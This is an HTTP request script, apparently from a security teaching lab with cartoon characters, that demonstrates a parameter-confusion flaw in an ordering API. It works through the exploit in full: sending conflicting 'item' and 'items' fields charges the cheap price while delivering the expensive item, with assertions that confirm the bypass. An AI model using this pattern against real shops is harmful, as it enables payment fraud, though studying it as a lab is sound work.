# @import ../common/setup.http
@host = {{base_host}}/v101

# Sandy releases a new app version that lets customers order multiple items at once.
# (Previously, the app only supported adding a single promotional combo per order)


# --- Legitimate Usage: Patrick orders multiple items using the new 'items' parameter ---

### Patrick places an order with multiple items via the updated app.
POST /orders
Authorization: {{patrick_auth}}
Content-Type: application/x-www-form-urlencoded

items=4&items=5


### Check Patrick's orders to confirm the multi-item order was created.
GET /orders
Authorization: {{patrick_auth}}


# --- Legitimate Usage: SpongeBob orders a single item using the legacy 'item' parameter ---

### SpongeBob orders via older app version that only lets him place a single-item order.
POST /orders
Authorization: {{spongebob_auth}}
Content-Type: application/x-www-form-urlencoded

item=1


### Check SpongeBob's orders to confirm the single-item order.
GET /orders
Authorization: {{spongebob_auth}}


# --- Exploit: Plankton pays for cheap item but receives the more expensive one ---

### First, check Plankton's balance before the exploit.
# @name initial_balance
GET /account/credits
Authorization: {{plankton_auth}}


### Get the cheapest and most expensive items from the menu
GET /menu

// Record the cheapest and most expensive items from the menu
@cheap_item = {{response.parsedBody.find(i => parseFloat(i.price) < 5)}}
@expensive_item = {{response.parsedBody.find(i => parseFloat(i.price) > 20)}}


### Plankton submits the exploit with conflicting `item` and `items` parameters
POST /orders
Authorization: {{plankton_auth}}
Content-Type: application/x-www-form-urlencoded

item={{cheap_item.id}}&items={{expensive_item.id}}

// Verification: Order created with cheap total but expensive item.
?? status == 201
?? js response.parsedBody.total == {{cheap_item.price}}
?? js response.parsedBody.items[0].name == {{expensive_item.name}}


### Check Plankton's balance after exploit to confirm only cheap price deducted.
# @name final_balance
GET /account/credits
Authorization: {{plankton_auth}}

{{
  const initial_credits = parseFloat(initial_balance.balance);
  const final_credits = parseFloat(response.parsedBody.balance);
  const deducted = initial_credits - final_credits;
  console.info(`Deducted amount: ${deducted.toFixed(2)} (should equal cheap item price: ${cheap_item.price}})`);
}}


### Check Plankton's orders to see the expensive item was received.
GET /orders
Authorization: {{plankton_auth}}

{{
  const last_order = response.parsedBody[response.parsedBody.length - 1];
  console.info(`The last order is: ${last_order.items[0].name} (\$${last_order.items[0].price})`);
}}
